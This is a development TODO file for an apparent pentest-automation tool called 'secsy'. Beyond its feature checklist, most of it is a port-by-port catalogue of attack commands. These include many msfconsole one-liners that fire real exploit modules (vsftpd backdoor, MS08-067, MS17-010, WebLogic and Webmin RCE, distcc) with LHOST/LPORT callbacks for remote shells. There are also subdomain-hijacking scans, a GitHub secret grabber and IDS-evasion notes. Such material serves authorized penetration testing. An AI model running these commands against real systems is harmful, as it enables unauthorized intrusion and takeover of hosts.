# TODO

v0.1.0

**DONE:**
- [x] feat: check for insecure SSL / TLS configurations
- [x] feat: IP Address v4 & v6 support
- [x] feat: select which results will be ignored in final reports, based on conditions
- [x] feat: autodiscover default tools
- [x] feat: transform secsy commands into Celery tasks dynamically, so that we can call:
    - [x] `httpx(something)` # run synchronously in main thread
    - [x] `httpx(something).delay()` # run in Celery worker, no wait for results
    - [x] result backend and task broker for Celery integration, add new class `Runner` which takes run configuration options (`cloud`, `celery`, `local (default)`)
- [x] feat: rework logging vs prints
- [x] feat: options '_' to '-' conversion
- [x] feat: check if IP is local before running some passive tools (e.g subfinder) as they output false positives
- [x] feat: add `mapcidr`
- [x] feat: add `fping`
- [x] feat: allow stdin input for all Secsy commands.
- [x] fix: `nmap` spend lots of time to convert results / get CVEs
- [x] feat: work on better proxy support, using `proxychains` and/or `free-proxy`
- [x] feat: improve multiple targets support + add tests for it

**TODO:**
- [ ] feat: consider using Celery alternative like Dramatiq because CELERY IS SO FUCKING ENNOYING TO WORK WITH SOMETIMES URGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
- [ ] feat: add indicator for subtasks finishing next to the task name (e.g: 1/5 means 1 chunk out of 5 have finished)
- [ ] feat: allow extra args supported by cmd but not supported by secsy yet ????????
- [ ] feat: Make new category class for fuzzers
- [ ] feat: Improve web login forms testing, add `login_forms` workflow and yield output cookies / session ID / token:
    - [ ] Add `--cookies` to http commands
    - [ ] Add `--data` to http commands
    - [ ] Add `ffuf -mr` to match text regex from errors (usefull for fuzzing)
    - [ ] Disable `ffuf` auto-calibration by default
- [ ] fix: disable `follow-redirects` by default as it hides some juicy endpoints
- [ ] feat: auto-collect missing params from command '--help'
- [ ] feat: add scan profiles
- [ ] feat: make Command inherit from Runner, add hooks / validators to Runner
- [ ] docs: add docs for building workflow / scan YAML files
- [ ] docs: add github-pages site
- [ ] fix: local filesystem broker is broken
- [ ] fix: `dirsearch` / `feroxbuster` tasks time out
- [ ] fix: broken tasks chunks should update main task results / results count.
- [ ] fix: Running task.run() and task.delay().get() should have the same output:
    - `[<ITEM1>,<ITEM2>]` for task.run()
    - `{'name': 'task', 'results': [<ITEM1>, <ITEM2>]}` for task.delay().get()
- [ ] fix: original targets are used instead of no targets when extractors return None (feature ?)
- [ ] refactor: use Celery `chunks` to chunk a task instead of own Fabric.
- [ ] test: test workflows like `secsy cmd mapcidr 192.168.1.0/24 --raw | secsy cmd fping --raw | secsy cmd naabu --raw | secsy cmd httpx --json --table`
- [ ] feat: add support for multi output types tool like `feroxbuster` or `nmap`
- [ ] feat: add `grype` code scanner
- [ ] feat: pull out tools output types into specific classes, e.g Port, Subdomain, Vulnerability
    - [ ] Pydantic + potential db schemas base ?
    - [ ] Used to format results as well
- [ ] feat: Turn `task.delay().get()` into an iterator. Need to subclass `AsyncResult` with an `__iter__(self)` function that runs `poll_live_tasks`, so that we can run:
    - `for result in task.delay():` and `for result in task:` in the same way
- [ ] feat: Allow (hidden) arguments of type `nuclei.rate-limit` or `NUCLEI_RATE_LIMIT` when running tasks / workflows.
- [ ] feat: Consider if using `selinon` to track tasks is worth it
- [ ] feat: Add scan ids to `Workflow` / `Scan` objects. Could be the Celery workflow task id for `Workflow`.
- [ ] feat: use previous results as input for next scan:  `secsy workflow --results previous / {path_to_json} / {scan_id}`
- [ ] feat: support multiple tasks with same name but differenciatesd - new notation with '<task_name>/<alias>' or `<task_name>:\n<alias>: alias` ?
- [ ] feat: parse multiple vulnerability ids
- [ ] feat: find exploits from CVEs
- [ ] feat: add `-stats` option to Nuclei to display scan status --> use status info for progress bar.
- [ ] feat: add tasks statuses under main progress bar (turn `console.status` into a `Live` instance)
- [ ] feat: `CTRL + C` should let you choose which tasks to abort from the client-side and the worker side.
- [ ] feat: add `arp-scan`
- [ ] feat: add techniques for IDS evasion (cf https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/ids-evasion)
- [ ] feat: make utils Celery tasks for:
    - [ ] Results filtering `filter_results`
    - [x] Results deduplication / merging `forward_results`
- [ ] feat: reporting
    - [ ] HTML reporting not based on Rich's export_html
    - [x] Save JSON report
    - [ ] Output live JSON items for workflows / scans so that they are consumable from library
- [ ] feat: add ways to create Workflows dynamically from code (need to revisit the way the output results are):
    ```
    from secsy.runners import Workflow, group

    host = 'wikipedia.org'
    tasks = subfinder.s(host, raw=True) | httpx.s(raw=True) | group(katana.s(), feroxbuster.s())
    workflow = Workflow.from_dsl(tasks)
    workflow.delay() # run in Celery worker (fast)
    workflow.run() # run synchronously (slow)

    def group(*tasks):
        return chain(forward_results.s(), chord(*tasks, forward_results), forward_results.s())
    ```

- [ ] feat: edit workflow YAML from environment variables and config parameters / overrides from CLI:
    `secsy config copy workflows/domain_recon domain_recon_2`
    `secsy config set workflows/domain_recon_2 workflow.opt1 10` # Workflow opt
    `secsy config set workflows/domain_recon_2 workflow.tasks.nmap.rate_limit 10` # Workflow task opt
    ```
- [ ] feat: generate reports from JSON with the CLI:
    `secsy report previous/<path_to_json_report> -o html`
    `secsy view <path_to_json_report> --table`
- [ ] feat: replace `console.log` by `logger.info` with rich logging handler (add Logging Handler and setup function) + Celery worker
- [ ] feat: autodiscover external tools
- [ ] feat: use --<tool>.<option_name> in the CLI (instead of `_`) to override option names.
- [ ] feat: make Docker image containing:
    - [ ] Automated install for all tools supported by `secsy`
    - [ ] Either:
        - [ ] Install `katoolin3` from my GitHub and all Kali packages --> installs all Kali Linux tools
        **OR**
        - [ ] Use a `kali` image as base so that most tools are already available
- [ ] feat: add external pluggable configs/ folder.
- [ ] feat: add tests for workflows / scans run
    - [ ] run_opts, workflow_opts, scan_opts, task_opts overrides
    - [ ] results deduplication tests
    - [ ] + integration tests for existing workflows

- **Integrations:**
    - OWASP ZAP [TODO]
    - Burp Suite [TODO]
    - Nessus
    - OpenVAS
    - Ivre # network scanner meta tool & relationship manager
    - YETI # relationship manager
    - amap [nope] # superseeded by nmap, but can be used for to get info on some services

    - **References:**
        - https://book.hacktricks.xyz/
        - https://0xffsec.com/
        - https://cheatsheet.haax.fr
        - https://pentestbook.six2dez.com/
        - https://pentestmonkey.net/
        - https://docs.trickest.io/
        - https://www.golinuxcloud.com/social-engineering-attacks/
        - https://many-passwords.github.io/
        - https://gtfobins.github.io/
        - https://www.vaadata.com/
        - https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0
        - https://kellyshortridge.com/blog/posts/index.html
        - https://www.deciduous.app/
        - https://www.esecurityplanet.com/threats/how-hackers-evade-detection/
        - https://www.esecurityplanet.com/networks/use-mitre-attck-to-understand-attacker-behavior/
        - https://www.netspi.com/blog/technical/network-penetration-testing/10-techniques-for-blindly-mapping-internal-networks/
        - https://hackertarget.com/quietly-mapping-the-network-attack-surface/
        - https://www.baeldung.com/linux/monitoring-http-requests-network-interfaces
        - https://scapy.readthedocs.io/en/latest/usage.html
        - https://blog.projectdiscovery.io/projectdiscovery-best-kept-secrets/
        - https://glitchii.github.io/embedbuilder/

    - **Tools:**

        - `exploit`:
            - msfconsole [x]
            - thc-hydra [TODO] # Network service pentest tool
            - jexboss [python][maybe] # JBoss verify and exploitation tool
            - shocker.py [python][maybe] # Shellshock tester
                - `python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 80`
            - smuggler [python][maybe] # HTTP request smuggling / desync testing tool
            - clusterd [python][maybe] # JBoss, ColdFusion, WebLogic, Tomcat, Railo, Axis2, Glassfish

        - `vuln`:
            - nuclei [x]
            - nmap-scripts [x]:
                - vulscan [x]
                - vulners [x]
            - nikto [perl][maybe, obsolete] # HTTP vulnerability scanner
            - cmsmap [python][maybe] # Find vulnerabilities in common CMS (Wordpress, Joomla, Drupal, Moodle)
            - arachni
            - Inject-X fuzzer [python][maybe] # Scan dynamic URLs for common OWASP vulns
            - [vuls](https://vuls.io/docs/en/main-features.html)

        - `bruteforce`:
            - https://0xffsec.com/handbook/brute-forcing/

        - `binary`:
            - AFplusplus [TODO] # Binary fuzzer for dinosaurs

        - `recon`:
            - `recon/multi`:
                - blackwidow [python][maybe]

            - `recon/windows`: 
                - https://www.netspi.com/blog/technical/network-penetration-testing/10-techniques-for-blindly-mapping-internal-networks/

            - `recon/network/internal`:
                - https://www.netspi.com/blog/technical/network-penetration-testing/10-techniques-for-blindly-mapping-internal-networks/

            - `recon/network`:
                - [x] `nmap` [x]
                - [ ] `wafwoof` [TODO]
                - [ ] whois [shell][maybe] # Network utility (WHOIS)
                - [ ] ssh-audit [python][maybe] # SSH server and client auditing
                - [ ] arp [TODO]
                - [ ] sslscan:
                    - `sslscan --no-failed $TARGET`
                - [ ] asnip:
                    - `asnip -t $TARGET`
                - [ ] hackertarget [python][maybe] # Network utilities (traceroute, ping test, reverse DNS, zone transfer, whois, ip location, tcp port scan, subnet lookup)
                - BruteX [shell][maybe] # Bruteforce all services
                - `curl -s https://www.ultratools.com/tools/ipWhoisLookupResult\?ipAddress\=$TARGET | grep -A2 label | grep -v input | grep span | cut -d">" -f2 | cut -d"<" -f1 | sed 's/\&nbsp\;//g'`
                - `wget -q http://www.intodns.com/$TARGET -O $LOOT_DIR/osint/intodns-$TARGET.html`
                - `curl -s -L --data "ip=$TARGET" https://2ip.me/en/services/information-service/provider-ip\?a\=act | grep -o -E '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/[0-9]{1,2}'` # subnet retrieval
            - `recon/http`:
                - [ ] gau [x]
                - [ ] gospider [x]
                - [ ] ffuf [x]
                - [ ] httpx [x]
                - [ ] dirsearch [TODO]
                - [ ] gobuster [TODO]
                - [ ] whatweb [ruby][nope]
                - [ ] wig 
                - [ ] webtech
                - [ ] curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2022-33-index?url=*.$TARGET&output=json" # passive spider
                - [ ] curl -s GET "https://api.hackertarget.com/pagelinks/?q=https://$TARGET" | egrep -v "API count|no links found|input url is invalid|API count|no links found|input url is invalid|error getting links"
                - [ ] wpscan [ruby][maybe] # Wordpress scan
            - `recon/dns`:
                - [ ] subfinder [go][x] # subdomain finder
                - [ ] spyse: # subdomain finder
                    - `spyse -target $TARGET --subdomains`
                - [ ] censys: # subdomain finder
                    - `python $PLUGINS_DIR/censys-subdomain-finder/censys_subdomain_finder.py --censys-api-id $CENSYS_APP_ID --censys-api-secret $CENSYS_API_SECRET $TARGET`
                - [ ] dnscan [?][maybe] # DNS bruteforcer
                    - `python3 $PLUGINS_DIR/dnscan/dnscan.py -d $TARGET -w $DOMAINS_QUICK -o $LOOT_DIR/domains/domains-dnscan-$TARGET.txt -i $LOOT_DIR/domains/domains-ips-$TARGET.txt`
                - [ ] crt.sh # gather certificate subdomain
                    - `curl -s https://crt.sh/?q=%25.$TARGET`
                - [ ] github-subdomains (https://github.com/1N3/AttackSurfaceManagement/blob/master/bin/github-subdomains.py)
                - [ ] urlcrazy:
                    - `urlcrazy $TARGET` # dns alterations
                - [ ] shodan:
                    - `shodan init $SHODAN_API_KEY`
                    - `shodan search "hostname:*.$TARGET"`
                - [ ] `curl -fsSL "https://dns.bufferover.run/dns?q=.$TARGET"`
                - [ ] `curl -s "https://rapiddns.io/subdomain/$TARGET?full=1&down=1#exportData()"`
                - [ ] subbrute:
                    - `python "$INSTALL_DIR/plugins/massdns/scripts/subbrute.py" $INSTALL_DIR/wordlists/domains-all.txt $TARGET`
                - [ ] altdns:
                    - `altdns -i /tmp/domain -w $INSTALL_DIR/wordlists/altdns.txt`
                - [ ] dnsgen:
                    - `dnsgen /tmp/domain`
                - [ ] massdns:
                    - `massdns -r /usr/share/sniper/plugins/massdns/lists/resolvers.txt $LOOT_DIR/domains/domains-$TARGET-alldns.txt -o S -t A -w $LOOT_DIR/domains/domains-$TARGET-massdns.txt`
                - [ ] `dig $TARGET CNAME | egrep -i "netlify|anima|bitly|wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|modulus|unbounce|uservoice|wpengine|cloudapp"` # CNAME subdomain hijacking
                - [ ] subover: # subdomain hijacking
                    - `subover -l $LOOT_DIR/domains/domains-$TARGET-full.txt`
                - [ ] subjack: # subdomain hijacking scan
                    - `~/go/bin/subjack -w $LOOT_DIR/domains/domains-$TARGET-full.txt -c ~/go/src/github.com/haccer/subjack/fingerprints.json -t $THREADS -timeout 30 -o $LOOT_DIR/nmap/subjack-$TARGET.txt -a -v`
            - `recon/cloud`:
                - cloud tools:
                    - [ ] `slurp` # S3 bucket enumerator 
                        - `./slurp-linux-amd64 domain --domain $TARGET` # S3 bucket scan
            - `recon/osint`:
                - [ ] `metagoofil`:
                    - `python metagoofil.py -d $TARGET -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $LOOT_DIR/osint/ -f $LOOT_DIR/osint/$TARGET.html` # online documents
                - [ ] `gitgraber`:
                    - `python3 gitGraber.py -q "\"org:$ORGANIZATION\""` # github secret grabber
                - [ ] `goohak`:
                    - `goohak $TARGET` # google hacking queries
                - [ ] `h8mail`:
                    - `h8mail -q domain --target $TARGET -o $LOOT_DIR/osint/h8mail-$TARGET.csv` # checking compromised credentials
                - [ ] `amass`:
                    - `amass enum -ip -o $LOOT_DIR/domains/domains-$TARGET-amass.txt -rf /usr/share/sniper/plugins/massdns/lists/resolvers.txt -d $TARGET` # dns subdomains
                    - `amass intel -whois -d $TARGET` # reverse whois
                    - `subfinder -o $LOOT_DIR/domains/domains-$TARGET-subfinder.txt -d $TARGET -nW -rL /sniper/wordlists/resolvers.txt`
                - [ ] theHarvester [python][maybe] # OSInt tool
                - [ ] `curl --insecure -L -s "https://urlscan.io/api/v1/search/?q=domain:$TARGET" 2> /dev/null | egrep "country|server|domain|ip|asn|$TARGET|prt"| sort -u` 
                - [ ] `curl -s "https://api.hunter.io/v2/domain-search?domain=$TARGET&api_key=$HUNTERIO_KEY"`
                - [ ] `msfconsole -x "use auxiliary/gather/search_email_collector; set DOMAIN $TARGET; run; exit y"` # gather emails via metasploit
                - [ ] `php /usr/share/sniper/bin/inurlbr.php --dork "site:$TARGET" -s inurlbr-$TARGET`
                - [ ] `curl -s https://www.email-format.com/d/$TARGET| grep @$TARGET | grep -v div | sed "s/\t//g" | sed "s/ //g"`
                - [ ] `dig`:
                    - `dig $TARGET txt | egrep -i 'spf|DMARC|dkim'` # email
                    - `dig iport._domainkey.${TARGET} txt | egrep -i 'spf|DMARC|DKIM'` # email
                    - `dig _dmarc.${TARGET} txt | egrep -i 'spf|DMARC|DKIM'` # email

- Run scripts for each port type:
    - 21/ftp:
        - `nmap -A -sV -Pn -sC -p 21 -v --script-timeout 90 --script=ftp-*`
        - `msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; exit;` # find FTP version
        - `msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/anonymous; run; exit;` # anonymous FTP scan
        - `msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use exploit/unix/ftp/vsftpd_234_backdoor; run; exit;"` # vsftpdf 2.3.4 backdoor exploit
        - `msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use unix/ftp/proftpd_133c_backdoor; run; exit;"` # proftpd 1.3.3c backdoor exploit
    - 22/ssh:
        - `nmap -A -sV -Pn -sC -p 22 -v --script-timeout 90 --script=ssh-*`
        - `msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_version; run; exit;"` # find SSH version
        - `msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_enumusers; run; exit;` # openssh user enumeration
        - `msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use scanner/ssh/libssh_auth_bypass; run; exit;"` # libSSH auth bypass exploit
    - 23/telnet:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=telnet*`
        - `msfconsole -q -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT";  run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"` # bruteforce telnet password
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=smtp*`
        - `msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"` # SMTP user enum
    - 53/dns:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=dns*`
    - 67/dhcp:
        - `nmap -A -sU -sV -Pn -v --script-timeout 90 --script=dhcp*`
    - 68/dhcp:
        - `nmap -A -sU -sV -Pn -v --script-timeout 90 --script=dhcp*`
    - 69/tftp:
        - `nmap -A -sU -sV -Pn -v --script-timeout 90 --script=tftp*`
    - 79/finger:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=finger*`
    - 110/pop:
        - `nmap -A -sV -v --script-timeout 90 --script=pop*`
    - 111/nfs:
        - `msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; back;exit;"` # NFS mount test
        - `showmount` # show mount information for remote NFS server
    - 123/ntp:
        - `nmap -A -sU -sV -Pn -v --script-timeout 90 --script=ntp-*`
    - 135/?:
        - `rpcinfo -p $TARGET` # status of RPC server
        - `nmap -A -p 135 -v --script-timeout 90 --script=rpc*`
        - `msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; back; exit;"`
    - 137/netbios:
        - `nmap -A -p 137 -v --script-timeout 90 --script=broadcast-netbios-master-browser*`
        - `msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;"` # Netbios name
    - 139/smb:
        - `nmap -A -sV -p 139 -v --script-timeout 90 --script=smb*` # SMB scripts
        - `enum4linux $TARGET` # SMB enumeration
        - `python impacket-samrdump $TARGET` # ?
        - `nbtscan` # Netbios nameserver scanner
        - `msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"`  # SNMP enum
    - 161/snmp:
        - `nmap -v --script-timeout 90 --script=/usr/share/nmap/scripts/vulners,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET`
        - `msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"` # SNMP enum
    - 162/snmp:
        - `nmap -v --script-timeout 90 --script=/usr/share/nmap/scripts/vulners,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET`
        - `msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"` # SNMP enum
    - 264/?:
        - `msfconsole -q -x "use auxiliary/gather/checkpoint_hostname; setg RHOSTS "$TARGET"; run; exit;"`
    - 389/?:
        - `nmap -A -p 389 -Pn -v --script-timeout 90 --script=ldap*`
        - `ldapsearch -h $TARGET 389 -x -s base -b '' "(objectClass=*)" "*"`
    - 445/smb:
        - `nmap -A -sV -Pn -p445 -v --script-timeout 90 --script=smb*`
        - `enum4linux $TARGET`
        - `python $SAMRDUMP $TARGET`
        - `nbtscan $TARGET`
        - `msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use auxiliary/scanner/smb/smb_version; run; use auxiliary/scanner/smb/pipe_auditor; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use exploit/windows/smb/ms06_040_netapi; run; use exploit/windows/smb/ms05_039_pnp; run; use exploit/windows/smb/ms10_061_spoolss; run; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"`
        - `msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use linux/samba/is_known_pipename; run; exit;"` # CVE-2017-7494
        - `msfconsole -q -x "use auxiliary/scanner/ike/cisco_ike_benigncertain; set RHOSTS "$TARGET"; set PACKETFILE /usr/share/metasploit-framework/data/exploits/cve-2016-6415/sendpacket.raw; set THREADS 24; set RPORT 500; run; exit;"` # CISCO Ike Key Disclosure Exploit
    - 512/rexec:
        - `nmap -A -sV -Pn -p 512 -v --script-timeout 90 --script=rexec*`
    - 513/rlogin:
        - `nmap -A -sV -Pn -p 513 -v --script-timeout 90 --script=rlogin*`
    - 514/?
        - `amap $TARGET 514 -A`
    - 1099/?
        - `amap $TARGET 1099 -A`
        - `nmap -A -sV -Pn -p 1099 -v --script-timeout 90 --script=rmi-*`
        - `msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run; exit;"`
        - `msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;"`
    - 1433/mssql:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=ms-sql*`
    - 2049/nfs:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=nfs*`
        - `rpcinfo -p $TARGET`
        - `showmount -e $TARGET`
        - `smbclient -L $TARGET -U " "%" "` # checking NULL share
    - 2181/?:
        - `stat | nc $TARGET 2181` # zookeeper RCE exploit
    - 3306/mysql:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=mysql*`
        - `msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS "$TARGET"; run; back; exit;"` # ping mysql
        - `nmap -A -p 3310 -Pn -sV  -v --script-timeout 90 --script=clamav-exec`
    - 3310/?:
        - `nmap -A -p 3310 -Pn -sV  -v --script-timeout 90 --script=clamav-exec`
    - 3128/?:
        - `nmap -A -p 3128 -Pn -sV  -v --script-timeout 90 --script=*proxy*`
    - 3389/rdp:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=rdp-*`
        - `msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS "$TARGET"; run; exit;"`
        - `msfconsole -q -x "use scanner/rdp/cve_2019_0708_bluekeep; setg RHOSTS "$TARGET"; run; exit;"`
        - `rdesktop $TARGET &`
    - 3632/distcc:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=distcc-*`
        - `msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use unix/misc/distcc_exec; run; exit;"`
    - 5432/pgsql:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=pgsql-brute`
        - `msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;"`
    - 5555/adb:
        - `adb connect $TARGET:5555`
        - `adb shell pm list packages`
    - 5800/vnc:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=vnc*`
    - 5900/vnc:
        - `nmap -A -sV  -v --script-timeout 90 --script=vnc*`
        - `msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;"` # None auth
    - 5984/couchdb:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=couchdb*`
        - `msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"`
        - `msfconsole -q -x "use exploit/linux/http/apache_couchdb_cmd_exec; set RHOSTS "$TARGET"; set RPORT 5984; setg LHOST $MSF_LHOST; setg $MSF_LPORT; run; exit;"`
    - 6000/x11:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=x11`
        - `msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"`
    - 6667/irc:
        - `nmap -A -sV -Pn -v --script-timeout 90 --script=irc*`
        - `msfconsole -q -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;"`
    - 7001/weblogic:
        - `nmap -sV -p 7001 -v --script-timeout 90 --script=weblogic-t3-info.nse`
        - `msfconsole -q -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL true; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;"`
        - `msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;"`
    - 8000/jdwp:
        - `msfconsole -q -x "use exploit/multi/misc/java_jdwp_debugger; setg RHOSTS "$TARGET"; set RPORT 8000; set SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;"`
    - 8001/rmi:
        - `amap $TARGET 8001 -A`
        - `nmap -A -sV -Pn -p 8001 -v --script-timeout 90 --script=rmi-*`
        - `msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; set RPORT 8001; run; exit;"`
        - `msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;"`
    - 9495/ibm:
        - `msfconsole -q -x "use exploit/windows/http/ibm_tivoli_endpoint_bof; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;"`
    - 10000/webmin:
        - `msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; set SSL True; run; exit;"`
        - `msfconsole -q -x "use exploit/web/defcon_webmin_unauth_rce; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; set SSL True; run; exit;"`
    - 16992/amt:
        - `msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;"`
    - 27017/mongodb:
        - `nmap -sV -p 27017 -Pn -v --script-timeout 90 --script=mongodb*`
    - 27018/mongodb:
        - `nmap -sV  -p 27018 -Pn -v --script-timeout 90 --script=mongodb*`
    - 27019/mongodb:
        - `nmap -sV  -p 27019 -Pn -v --script-timeout 90 --script=mongodb*`
    - 28017/mongodb:
        - `nmap -sV  -p 28017 -Pn -v --script-timeout 90 --script=mongodb*`
    - 49180/java_rmi_server:
